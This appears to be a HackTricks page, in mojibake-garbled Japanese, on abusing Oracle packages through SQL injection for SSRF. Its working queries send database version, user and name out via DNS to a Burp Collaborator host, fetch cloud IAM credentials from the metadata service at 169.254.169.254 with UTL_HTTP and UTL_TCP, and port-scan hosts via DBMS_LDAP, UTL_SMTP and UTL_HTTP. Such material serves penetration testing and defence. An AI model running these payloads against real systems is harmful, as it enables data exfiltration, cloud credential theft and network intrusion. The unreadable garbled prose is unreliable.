<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>


# SSRF

**æƒ…å ±ã¯ã“ã¡ã‚‰ã‹ã‚‰ã‚³ãƒ”ãƒ¼ã—ã¾ã—ãŸ** [**https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#oracle**](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#oracle)

Oracleã‚’ä½¿ç”¨ã—ã¦ã€Out of Bandã®HTTPãŠã‚ˆã³DNSãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†æ–¹æ³•ã¯ã€SQLãƒ‡ãƒ¼ã‚¿ã®ã‚¨ã‚¯ã‚¹ãƒ•ã‚£ãƒ«ãƒˆæ‰‹æ®µã¨ã—ã¦ã‚ˆãæ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯/é–¢æ•°ã‚’å¤‰æ›´ã—ã¦ã€ä»–ã®SSRF/XSPAã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

Oracleã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã¯éå¸¸ã«é¢å€’ã§ã™ãŒã€ã‚³ãƒãƒ³ãƒ‰ã‚’è©¦ã™ãŸã‚ã«ç´ æ—©ãã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã—ãŸã„å ´åˆã¯ç‰¹ã«ãã†ã§ã™ã€‚ç§ã®å‹äººã§ã‚ã‚Šã€[Appsecco](https://appsecco.com)ã®åŒåƒšã§ã‚ã‚‹[Abhisek Datta](https://github.com/abhisek)ã¯ã€[https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c)ã‚’ç´¹ä»‹ã—ã¦ãã‚Œã¾ã—ãŸã€‚ã“ã‚Œã«ã‚ˆã‚Šã€t2.large AWS Ubuntuãƒã‚·ãƒ³ã¨Dockerä¸Šã«ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚

ã“ã®ãƒ–ãƒ­ã‚°ãƒã‚¹ãƒˆã®éç¨‹ã§ã€Oracleã‚’ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã¨ã—ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ã‚¯ã‚»ã‚¹ã‚’å®Œå…¨ã«å‚™ãˆãŸã‚‚ã®ã¨ã—ã¦æ¨¡å€£ã™ã‚‹ãŸã‚ã«ã€dockerã‚³ãƒãƒ³ãƒ‰ã‚’`--network="host"`ãƒ•ãƒ©ã‚°ã¨ã¨ã‚‚ã«å®Ÿè¡Œã—ã¾ã—ãŸã€‚
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
### URLã¾ãŸã¯ãƒ›ã‚¹ãƒˆå/ãƒãƒ¼ãƒˆç•ªå·ã®æŒ‡å®šã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹Oracleãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

ãƒ›ã‚¹ãƒˆã¨ãƒãƒ¼ãƒˆã®æŒ‡å®šã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¨é–¢æ•°ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã€ç§ã¯[Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html)ã§Googleæ¤œç´¢ã‚’å®Ÿè¡Œã—ã¾ã—ãŸã€‚å…·ä½“çš„ã«ã¯ã€ä»¥ä¸‹ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¨é–¢æ•°ãŒè¦‹ã¤ã‹ã‚Šã¾ã—ãŸã€‚
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
ä»¥ä¸‹ã¯ã€æ¤œç´¢çµæœã§ã™ï¼ˆã™ã¹ã¦ãŒã‚¢ã‚¦ãƒˆãƒã‚¦ãƒ³ãƒ‰ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

ã“ã®ç°¡å˜ãªæ¤œç´¢ã§ã¯ã€`DBMS_LDAP`ï¼ˆãƒ›ã‚¹ãƒˆåã¨ãƒãƒ¼ãƒˆç•ªå·ã‚’æ¸¡ã™ã“ã¨ãŒã§ãã‚‹ï¼‰ã®ã‚ˆã†ãªãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯ã‚¹ã‚­ãƒƒãƒ—ã•ã‚Œã¾ã™ã€‚[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãƒšãƒ¼ã‚¸](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)ã¯ã€å˜ã«[åˆ¥ã®å ´æ‰€](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)ã‚’æŒ‡ã™ã ã‘ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€è¦‹è½ã¨ã—ãŸå¯èƒ½æ€§ã®ã‚ã‚‹ä»–ã®Oracleãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ãŒã€ã‚¢ã‚¦ãƒˆãƒã‚¦ãƒ³ãƒ‰ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã„ãšã‚Œã«ã›ã‚ˆã€ä¸Šè¨˜ã§ç™ºè¦‹ã—ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã—ãŸã„ãã¤ã‹ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

**DBMS\_LDAP.INIT**

`DBMS_LDAP`ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯ã€LDAPã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ã€‚`init()`é–¢æ•°ã¯ã€LDAPã‚µãƒ¼ãƒãƒ¼ã¨ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’åˆæœŸåŒ–ã—ã€ãƒ›ã‚¹ãƒˆåã¨ãƒãƒ¼ãƒˆç•ªå·ã‚’å¼•æ•°ã¨ã—ã¦å—ã‘å–ã‚Šã¾ã™ã€‚

ã“ã®é–¢æ•°ã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã«DNSçµŒç”±ã§ã®ãƒ‡ãƒ¼ã‚¿ã®å¤–éƒ¨ã¸ã®æµå‡ºã‚’ç¤ºã™ãŸã‚ã«ä»¥å‰ã«æ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
ãŸã ã—ã€é–¢æ•°ã¯ãƒ›ã‚¹ãƒˆåã¨ãƒãƒ¼ãƒˆç•ªå·ã‚’å¼•æ•°ã¨ã—ã¦å—ã‘å–ã‚‹ãŸã‚ã€ã“ã‚Œã‚’ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒŠã®ã‚ˆã†ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

ä»¥ä¸‹ã«ã„ãã¤ã‹ã®ä¾‹ã‚’ç¤ºã—ã¾ã™ã€‚
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/18.png)

`ORA-31203: DBMS_LDAP: PL/SQL - åˆæœŸåŒ–ã«å¤±æ•—ã—ã¾ã—ãŸã€‚`ã¯ã€ãƒãƒ¼ãƒˆãŒé–‰ã˜ã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ãŒã€ã‚»ãƒƒã‚·ãƒ§ãƒ³å€¤ã¯ãƒãƒ¼ãƒˆãŒé–‹ã„ã¦ã„ã‚‹ã“ã¨ã‚’æŒ‡ã—ã¦ã„ã¾ã™ã€‚

**UTL\_SMTP**

`UTL_SMTP`ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯ã€SMTPçµŒç”±ã§ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã™ã€‚[Oracleã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚µã‚¤ãƒˆã«æä¾›ã•ã‚Œã¦ã„ã‚‹ä¾‹ã§ã¯ã€ã“ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã—ã¦ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡ã™ã‚‹æ–¹æ³•ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478)ã€‚ã—ã‹ã—ã€ç§ãŸã¡ã«ã¨ã£ã¦èˆˆå‘³æ·±ã„ã®ã¯ã€ãƒ›ã‚¹ãƒˆã¨ãƒãƒ¼ãƒˆã®æŒ‡å®šãŒå¯èƒ½ãªç‚¹ã§ã™ã€‚

ä»¥ä¸‹ã«ã€ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆãŒ2ç§’ã®`UTL_SMTP.OPEN_CONNECTION`é–¢æ•°ã®ç°¡å˜ãªä¾‹ã‚’ç¤ºã—ã¾ã™ã€‚
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/19.png)

`ORA-29276: transfer timeout`ã¯ãƒãƒ¼ãƒˆãŒé–‹ã„ã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ãŒã€SMTPæ¥ç¶šãŒç¢ºç«‹ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚ä¸€æ–¹ã€`ORA-29278: SMTP transient error: 421 Service not available`ã¯ãƒãƒ¼ãƒˆãŒé–‰ã˜ã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

**UTL\_TCP**

`UTL_TCP`ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¨ãã®æ‰‹ç¶šããŠã‚ˆã³é–¢æ•°ã¯ã€[TCP/IPãƒ™ãƒ¼ã‚¹ã®ã‚µãƒ¼ãƒ“ã‚¹ã¨ã®é€šä¿¡](https://docs.oracle.com/cd/B28359\_01/appdev.111/b28419/u\_tcp.htm#i1004190)ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ç‰¹å®šã®ã‚µãƒ¼ãƒ“ã‚¹ã«å¯¾ã—ã¦ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã“ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¸ã®ä¾µå…¥çµŒè·¯ã¨ãªã‚‹ã‹ã€TCP/IPæ¥ç¶šã®ã™ã¹ã¦ã®å´é¢ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ãŸã‚ã€å®Œå…¨ãªã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Oracleã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚µã‚¤ãƒˆã®ä¾‹ã§ã¯ã€ã“ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã—ã¦ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®ç”Ÿã®TCPæ¥ç¶šã‚’ä½œæˆã™ã‚‹æ–¹æ³•ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚ã•ã‚‰ã«ç°¡ç•¥åŒ–ã—ã¦ã€ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚„ä»»æ„ã®TCP/IPã‚µãƒ¼ãƒ“ã‚¹ã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/20.png)
```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/21.png)

èˆˆå‘³æ·±ã„ã“ã¨ã«ã€ç”Ÿã®TCPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä½œæˆã§ãã‚‹ãŸã‚ã€ã“ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯TCPãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã§ãƒ¡ã‚½ãƒƒãƒ‰ã‚¿ã‚¤ãƒ—ã‚„è¿½åŠ ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ã™ã¹ã¦æ¸¡ã™ã“ã¨ãŒã§ãã‚‹ãŸã‚ã€ã™ã¹ã¦ã®ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ—ãƒ­ãƒã‚¤ãƒ€ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚µãƒ¼ãƒ“ã‚¹ã‚’ã‚¯ã‚¨ãƒªã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚

**UTL\_HTTPã¨Webãƒªã‚¯ã‚¨ã‚¹ãƒˆ**

ãŠãã‚‰ãã€ã‚ã‚‰ã‚†ã‚‹Out of Band Oracle SQL Injectionãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã§æœ€ã‚‚ä¸€èˆ¬çš„ã§åºƒãæ–‡æ›¸åŒ–ã•ã‚ŒãŸãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€[`UTL_HTTP`ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070)ã§ã™ã€‚ã“ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã§æ¬¡ã®ã‚ˆã†ã«å®šç¾©ã•ã‚Œã¦ã„ã¾ã™ - `UTL_HTTPãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯ã€SQLã¨PL/SQLã‹ã‚‰ã®ãƒã‚¤ãƒ‘ãƒ¼ãƒ†ã‚­ã‚¹ãƒˆè»¢é€ãƒ—ãƒ­ãƒˆã‚³ãƒ«ï¼ˆHTTPï¼‰å‘¼ã³å‡ºã—ã‚’è¡Œã„ã¾ã™ã€‚ãã‚Œã‚’ä½¿ç”¨ã—ã¦ã€HTTPçµŒç”±ã§ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®ãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/16.png)

ã•ã‚‰ã«ã€æ¬¡ã®ã‚ˆã†ãªã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ã€åŸºæœ¬çš„ãªãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã‚‚å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/17.png)

`ORA-12541: TNS:no listener`ã¾ãŸã¯`TNS:operation timed out`ã¯ã€TCPãƒãƒ¼ãƒˆãŒé–‰ã˜ã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ä¸€æ–¹ã€`ORA-29263: HTTP protocol error`ã¾ãŸã¯ãƒ‡ãƒ¼ã‚¿ã¯ã€ãƒãƒ¼ãƒˆãŒé–‹ã„ã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

éå»ã«ä½¿ç”¨ã—ãŸåˆ¥ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯ã€[`HTTPURITYPE`ã‚ªãƒ©ã‚¯ãƒ«æŠ½è±¡å‹ã®`GETCLOB()`ãƒ¡ã‚½ãƒƒãƒ‰](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705)ã§ã™ã€‚ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€URLã¨ã®ã‚„ã‚Šå–ã‚ŠãŒå¯èƒ½ã§ã€HTTPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ã‚µãƒãƒ¼ãƒˆã‚‚æä¾›ã•ã‚Œã¾ã™ã€‚`GETCLOB()`ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€URLã‹ã‚‰ã®GETãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’[CLOBãƒ‡ãƒ¼ã‚¿å‹](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)ã¨ã—ã¦å–å¾—ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/22.png)](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¾ã—ã‚‡ã†ã€‚

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡º**ã—ã¦ãã ã•ã„ã€‚

</details>
